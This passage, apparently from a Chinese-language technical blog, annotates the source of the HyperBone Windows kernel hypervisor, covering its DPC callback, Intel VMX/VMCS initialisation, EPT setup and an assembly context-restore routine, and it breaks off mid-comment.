class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">HvmpHVCallbackDPC</span><span class="params">( PRKDPC Dpc, PVOID Context, PVOID SystemArgument1, PVOID SystemArgument2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    DPC（Deferred Procedure Call）是一种延迟执行的过程调用机制，</span></span><br><span class="line"><span class="comment">    用于在计算机系统的中断或系统事件处理过程完成后，延迟执行一些需要高优先级处理的任务或回调函数。</span></span><br><span class="line"><span class="comment">    DPC的执行是在系统抢占模式下进行的，因此可以保证其执行的稳定性和一致性。</span></span><br><span class="line"><span class="comment">    使用DPC可以实现一些延迟处理的任务，例如缓冲区刷新、资源回收、数据处理等。</span></span><br><span class="line"><span class="comment">    通过将这些任务置于DPC中执行，可以避免阻塞正常的中断处理程序或系统服务例程，提高系统的效率和响应性能。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Dpc );<span class="comment">// Dpc是一个未使用的参数</span></span><br><span class="line">    PVCPU pVCPU = &amp;g_Data-&gt;cpu_data[CPU_IDX];<span class="comment">// 获取当前处理器的虚拟处理器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if we are loading, or unloading</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ARGUMENT_PRESENT</span>( Context ))<span class="comment">// 检测Context是否被传递，通过Context参数判断是加载还是卸载</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 执行对应的初始化操作</span></span><br><span class="line">        g_Data-&gt;CPUVendor == CPU_Intel ? <span class="built_in">IntelSubvertCPU</span>( pVCPU, Context ) : <span class="built_in">AMDSubvertCPU</span>( pVCPU, Context );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 恢复虚拟处理器</span></span><br><span class="line">        g_Data-&gt;CPUVendor == CPU_Intel ? <span class="built_in">IntelRestoreCPU</span>( pVCPU ) : <span class="built_in">AMDRestoreCPU</span>( pVCPU );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待所有DPC同步，传入同步信号量</span></span><br><span class="line">    <span class="built_in">KeSignalCallDpcSynchronize</span>( SystemArgument2 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记DPC执行完成，传入完成信号量</span></span><br><span class="line">    <span class="built_in">KeSignalCallDpcDone</span>( SystemArgument1 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="初始化IntelCPU"><a href="#初始化IntelCPU" class="headerlink" title="初始化IntelCPU"></a>初始化IntelCPU</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HVM.c</span></span><br><span class="line"><span class="comment">// Vendor-specific calls</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> VOID <span class="title">IntelSubvertCPU</span><span class="params">( IN PVCPU Vcpu, IN PVOID SystemDirectoryTableBase )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">VmxInitializeCPU</span>( Vcpu, (ULONG64)SystemDirectoryTableBase );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VMX.c</span></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Virtualize LP 初始化逻辑处理器</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemDirectoryTableBase&quot;&gt;Kernel CR3&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxInitializeCPU</span><span class="params">( IN PVCPU Vcpu, IN ULONG64 SystemDirectoryTableBase )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    存储处理器的休眠状态，其中包含所有特殊寄存器和MSR（模型特定寄存器），</span></span><br><span class="line"><span class="comment">    VMCS（虚拟机控制结构）将需要这些作为其设置的一部分。这样可以避免使用汇编序列</span></span><br><span class="line"><span class="comment">    并手动读取这些数据。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    KeSaveStateForHibernate是Windows内核函数，用于保存处理器的状态以进行休眠操作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在Windows系统中，当计算机进入休眠状态时，操作系统需要保存处理器的当前状态，</span></span><br><span class="line"><span class="comment">    包括寄存器、程序计数器（指令指针）以及其他关键的执行上下文信息。</span></span><br><span class="line"><span class="comment">    这样，在计算机重新唤醒时，系统可以从先前保存的状态中恢复，并继续执行之前的操作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    KeSaveStateForHibernate函数的作用就是将当前处理器的状态保存到内存中，</span></span><br><span class="line"><span class="comment">    以便后续的休眠操作使用。它会将所有的特殊寄存器、模型特定寄存器、以及一般寄存器的值保存起来，</span></span><br><span class="line"><span class="comment">    确保在休眠期间数据不会丢失。具体而言，该函数会将处理器状态保存到与休眠操作相关的数据结构中。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    这个函数通常由操作系统内核在准备进入休眠状态之前调用，以便将当前的处理器状态保存下来。</span></span><br><span class="line"><span class="comment">    然后，在计算机唤醒时，操作系统可以使用相应的函数来还原保存的状态，以实现无缝的恢复。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">KeSaveStateForHibernate</span>( &amp;Vcpu-&gt;HostState );<span class="comment">// 启动之前确保可以保存现有处理器状态，确保在虚拟化期间数据不会丢失</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    捕获整个寄存器状态。因为一旦启动虚拟机，它将从定义的客户机指令指针处开始执行，</span></span><br><span class="line"><span class="comment">    该指针会在此调用中被捕获。换句话说，我们将返回到我们的原始位置，但由于VMCS/VMX初始化代码的影响，</span></span><br><span class="line"><span class="comment">    我们的寄存器都被破坏了（因为客户机状态不包括寄存器状态）。通过在这里保存上下文，</span></span><br><span class="line"><span class="comment">    包括所有通用寄存器，我们保证返回时我们也能恢复我们的起始寄存器值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">RtlCaptureContext</span>( &amp;Vcpu-&gt;HostState.ContextFrame );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据上述情况，在这里可以判断虚拟机实际上是否已启动。</span></span><br><span class="line"><span class="comment">    我们可以通过验证VmxEnabled字段的值来检查这一点，该字段在执行VMXLAUNCH之前设置为1。</span></span><br><span class="line"><span class="comment">    在此函数中，我们不使用Data参数或任何其他局部寄存器，并且事实上VmxEnabled是不确定的，</span></span><br><span class="line"><span class="comment">    因为根据上述情况，由于VMCALL本身，我们的寄存器状态当前是脏的。</span></span><br><span class="line"><span class="comment">    通过结合全局变量和API调用使用它，我们还确保编译器不会以任何方式优化此访问，</span></span><br><span class="line"><span class="comment">    即使在LTGC/Ox构建上也是如此。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;cpu_data[CPU_IDX].VmxState == VMX_STATE_TRANSITION)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        表示虚拟机已启动，因此即将将GPR（通用寄存器）还原为其原始值。</span></span><br><span class="line"><span class="comment">        这将使我们再次回到上一行代码，但是这次VmxEnabled的值将为2，绕过if和else if检查。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        g_Data-&gt;cpu_data[CPU_IDX].VmxState = VMX_STATE_ON;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        最后，恢复上下文，以便最终恢复所有寄存器和堆栈状态。通过继续以这种方式引用每个VP数据，</span></span><br><span class="line"><span class="comment">        编译器将继续生成非优化的访问，确保不会破坏先前的寄存器状态。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">VmRestoreContext</span>( &amp;g_Data-&gt;cpu_data[CPU_IDX].HostState.ContextFrame );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    尚未尝试启动虚拟机，也没有启动它。换句话说，</span></span><br><span class="line"><span class="comment">    这是第一次调用VmxInitializeCPU。因此，我们可以自由地使用所有寄存器状态。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (g_Data-&gt;cpu_data[CPU_IDX].VmxState == VMX_STATE_OFF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        首先，捕获SYSTEM进程的PML4（页目录表）的值，以便无论当前LP中断哪个进程，</span></span><br><span class="line"><span class="comment">        所有虚拟处理器都可以共享正确的内核地址空间。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        在x86-64架构下，操作系统内核和用户进程共享同一个物理地址空间。为了实现这个地址空间共享，</span></span><br><span class="line"><span class="comment">        x86-64架构定义了一个层次化的虚拟内存地址转换机制，这个机制包括页表、页目录表和页全局目录等数据结构。</span></span><br><span class="line"><span class="comment">        其中，页全局目录是整个地址空间的根节点，每个进程都有一个自己的页全局目录。</span></span><br><span class="line"><span class="comment">        页目录表用来描述一个进程的用户地址空间，</span></span><br><span class="line"><span class="comment">        而具有特殊权限的内核空间也需要一个页目录表来映射内核地址空间。</span></span><br><span class="line"><span class="comment">        &quot;捕获SYSTEM进程的PML4（页目录表）的值&quot;，</span></span><br><span class="line"><span class="comment">        实际上就是获取当前系统的内核页目录表的物理地址，以便后续的操作可以正确地访问内核的地址空间。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        由于LP调度器会将不同进程调度到不同的逻辑处理器上执行，</span></span><br><span class="line"><span class="comment">        为了保证多个逻辑处理器之间能够正确地共享内核地址空间，</span></span><br><span class="line"><span class="comment">        必须要使所有的虚拟处理器共享同一个内核页目录表。</span></span><br><span class="line"><span class="comment">        因此，在运行任意一个进程之前，需要将其对应的页目录表设置为内核页目录表的地址，即代码中所描述的部分。</span></span><br><span class="line"><span class="comment">        以保证该进程可以正确地访问内核地址空间。这可以通过在LP上下文切换时，</span></span><br><span class="line"><span class="comment">        将当前进程的页目录表设置为系统内核页目录表的物理地址来实现。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        Vcpu-&gt;SystemDirectoryTableBase = SystemDirectoryTableBase;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试在该处理器上初始化VMX</span></span><br><span class="line">        <span class="built_in">VmxSubvertCPU</span>( Vcpu );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从-CONTEXT-结构体中恢复寄存器上下文"><a href="#从-CONTEXT-结构体中恢复寄存器上下文" class="headerlink" title="从 CONTEXT 结构体中恢复寄存器上下文"></a>从 CONTEXT 结构体中恢复寄存器上下文</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">VmRestoreContext PROC</span><br><span class="line">; 与RtlCaptureContext()兼容。使用此函数代替RtlRestoreContext()函数，以便在Win10 15063+版本上不会由于RSP检查而导致蓝屏。</span><br><span class="line">push rbp</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">sub rsp, 30h</span><br><span class="line">mov rbp, rsp</span><br><span class="line">movaps  xmm0, xmmword ptr [rcx+1A0h]</span><br><span class="line">movaps  xmm1, xmmword ptr [rcx+1B0h]</span><br><span class="line">movaps  xmm2, xmmword ptr [rcx+1C0h]</span><br><span class="line">movaps  xmm3, xmmword ptr [rcx+1D0h]</span><br><span class="line">movaps  xmm4, xmmword ptr [rcx+1E0h]</span><br><span class="line">movaps  xmm5, xmmword ptr [rcx+1F0h]</span><br><span class="line">movaps  xmm6, xmmword ptr [rcx+200h]</span><br><span class="line">movaps  xmm7, xmmword ptr [rcx+210h]</span><br><span class="line">movaps  xmm8, xmmword ptr [rcx+220h]</span><br><span class="line">movaps  xmm9, xmmword ptr [rcx+230h]</span><br><span class="line">movaps  xmm10, xmmword ptr [rcx+240h]</span><br><span class="line">movaps  xmm11, xmmword ptr [rcx+250h]</span><br><span class="line">movaps  xmm12, xmmword ptr [rcx+260h]</span><br><span class="line">movaps  xmm13, xmmword ptr [rcx+270h]</span><br><span class="line">movaps  xmm14, xmmword ptr [rcx+280h]</span><br><span class="line">movaps  xmm15, xmmword ptr [rcx+290h]</span><br><span class="line">ldmxcsr dword ptr [rcx+34h]</span><br><span class="line"></span><br><span class="line">mov     ax, [rcx+42h]</span><br><span class="line">mov     [rsp+20h], ax</span><br><span class="line">mov     rax, [rcx+98h] ; RSP</span><br><span class="line">mov     [rsp+18h], rax</span><br><span class="line">mov     eax, [rcx+44h]</span><br><span class="line">mov     [rsp+10h], eax</span><br><span class="line">mov     ax, [rcx+38h]</span><br><span class="line">mov     [rsp+08h], ax</span><br><span class="line">mov     rax, [rcx+0F8h] ; RIP</span><br><span class="line">mov     [rsp+00h], rax ; set RIP as return address (for iretq instruction).</span><br><span class="line"></span><br><span class="line">mov     rax, [rcx+78h]</span><br><span class="line">mov     rdx, [rcx+88h]</span><br><span class="line">mov     r8, [rcx+0B8h]</span><br><span class="line">mov     r9, [rcx+0C0h]</span><br><span class="line">mov     r10, [rcx+0C8h]</span><br><span class="line">mov     r11, [rcx+0D0h]</span><br><span class="line">cli</span><br><span class="line">mov     rbx, [rcx+90h]</span><br><span class="line">mov     rsi, [rcx+0A8h]</span><br><span class="line">mov     rdi, [rcx+0B0h]</span><br><span class="line">mov     rbp, [rcx+0A0h]</span><br><span class="line">mov     r12, [rcx+0D8h]</span><br><span class="line">mov     r13, [rcx+0E0h]</span><br><span class="line">mov     r14, [rcx+0E8h]</span><br><span class="line">mov     r15, [rcx+0F0h]</span><br><span class="line">mov     rcx, [rcx+80h]</span><br><span class="line">iretq</span><br><span class="line"></span><br><span class="line">VmRestoreContext ENDP</span><br></pre></td></tr></table></figure><h4 id="使用Intel虚拟化技术启动虚拟机，创建虚拟CPU"><a href="#使用Intel虚拟化技术启动虚拟机，创建虚拟CPU" class="headerlink" title="使用Intel虚拟化技术启动虚拟机，创建虚拟CPU"></a>使用Intel虚拟化技术启动虚拟机，创建虚拟CPU</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Execute VMLAUNCH</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Vcpu&quot;&gt;Virtyal CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxSubvertCPU</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PHYSICAL_ADDRESS phys = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    phys.QuadPart = MAXULONG64;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化所有与VMX相关的MSR，通过读取它们的值来初始化</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt;= <span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_VMCS_ENUM ); i++)</span><br><span class="line">        Vcpu-&gt;MsrData[i].QuadPart = __readmsr( MSR_IA32_VMX_BASIC + i );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据系统支持的功能，初始化次级控制（secondary controls）、真实模型专用寄存器（true MSRs）和VMFUNC</span></span><br><span class="line">    <span class="comment">// 见VmxCheckFeatures()</span></span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;Features.SecondaryControls)</span><br><span class="line">        Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_PROCBASED_CTLS2 )].QuadPart = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS2 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// True MSRs, if present</span></span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;Features.TrueMSRs)</span><br><span class="line">        <span class="keyword">for</span> (ULONG i = <span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_PINBASED_CTLS ); i &lt;= <span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_ENTRY_CTLS ); i++)</span><br><span class="line">            Vcpu-&gt;MsrData[i].QuadPart = __readmsr( MSR_IA32_VMX_BASIC + i );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// VMFUNC, if present</span></span><br><span class="line">    <span class="keyword">if</span>(g_Data-&gt;Features.VMFUNC)</span><br><span class="line">        Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_VMFUNC )].QuadPart = __readmsr( MSR_IA32_VMX_VMFUNC );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配VMXON、VMCS和VMM堆栈内存</span></span><br><span class="line">    Vcpu-&gt;VMXON    = <span class="built_in">MmAllocateContiguousMemory</span>( <span class="built_in">sizeof</span>( VMX_VMCS ), phys );</span><br><span class="line">    Vcpu-&gt;VMCS     = <span class="built_in">MmAllocateContiguousMemory</span>( <span class="built_in">sizeof</span>( VMX_VMCS ), phys );</span><br><span class="line">    Vcpu-&gt;VMMStack = <span class="built_in">MmAllocateContiguousMemory</span>( KERNEL_STACK_SIZE,  phys );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Vcpu-&gt;VMXON || !Vcpu-&gt;VMCS || !Vcpu-&gt;VMMStack)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Failed to allocate memory\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进行保护设置</span></span><br><span class="line">    <span class="built_in">UtilProtectNonpagedMemory</span>( Vcpu-&gt;VMXON,    <span class="built_in">sizeof</span>( VMX_VMCS ), PAGE_READWRITE );</span><br><span class="line">    <span class="built_in">UtilProtectNonpagedMemory</span>( Vcpu-&gt;VMCS,     <span class="built_in">sizeof</span>( VMX_VMCS ), PAGE_READWRITE );</span><br><span class="line">    <span class="built_in">UtilProtectNonpagedMemory</span>( Vcpu-&gt;VMMStack, KERNEL_STACK_SIZE,  PAGE_READWRITE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化内存空间</span></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( Vcpu-&gt;VMXON,    <span class="built_in">sizeof</span>( VMX_VMCS ) );</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( Vcpu-&gt;VMCS,     <span class="built_in">sizeof</span>( VMX_VMCS ) );</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( Vcpu-&gt;VMMStack, KERNEL_STACK_SIZE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试进入VMX Root模式</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">VmxEnterRoot</span>( Vcpu ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// I继续配置VMCS虚拟机控制结构（包括guest和host状态）</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        VMCS是是一种数据结构，用于存储虚拟机的状态信息，如处理器寄存器、段描述符、中断描述符等等。</span></span><br><span class="line"><span class="comment">        VMCS包含了虚拟机执行环境的所有状态信息，是虚拟机管理软件和硬件虚拟化扩展之间的接口。</span></span><br><span class="line"><span class="comment">        VMCS中有两种状态：guest状态和host状态。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        guest状态是指在虚拟机内执行的代码所使用的状态。</span></span><br><span class="line"><span class="comment">        当虚拟化软件将控制权转移到虚拟机内部时，处理器会使用VMCS中的guest状态信息来切换到虚拟机的执行环境。</span></span><br><span class="line"><span class="comment">        guest状态包含了虚拟机内部的所有状态信息，如处理器寄存器、页表、分段描述符等等。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        host状态是指在虚拟机外执行的代码所使用的状态。当虚拟机执行完成后，</span></span><br><span class="line"><span class="comment">        处理器需要恢复到虚拟化软件的执行环境中。</span></span><br><span class="line"><span class="comment">        VMCS中的host状态信息就提供了这个执行环境所需要的状态信息，如处理器寄存器、页表、分段描述符等等。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        在VMCS中，不同类型的状态信息被分为不同的区域，</span></span><br><span class="line"><span class="comment">        如控制区、guest状态区、host状态区等等。通过对VMCS的设置，虚拟化软件可以控制虚拟机的行为，</span></span><br><span class="line"><span class="comment">        如内存地址翻译、中断处理等等。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">VmxSetupVMCS</span>( Vcpu );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置EPT</span></span><br><span class="line">        <span class="keyword">if</span>(g_Data-&gt;Features.EPT)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( <span class="built_in">EptBuildIdentityMap</span>( &amp;Vcpu-&gt;EPT ) ))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Failed to build EPT identity map\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">                <span class="keyword">goto</span> failedvmxoff;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">EptEnable</span>( Vcpu-&gt;EPT.PML4Ptr );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录VMX已开启</span></span><br><span class="line">        Vcpu-&gt;VmxState = VMX_STATE_TRANSITION;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在VmxSetupVmcs函数中设置了各种VMCS字段（VMCS fields）,</span></span><br><span class="line">        <span class="comment">// 让处理器跳转到VmxInitializeCPU中调用VmxSetupVmcs的RtlCaptureContext函数的返回地址。</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        RtlCaptureContext是一个Windows操作系统提供的函数，用于获取当前线程的上下文信息，</span></span><br><span class="line"><span class="comment">        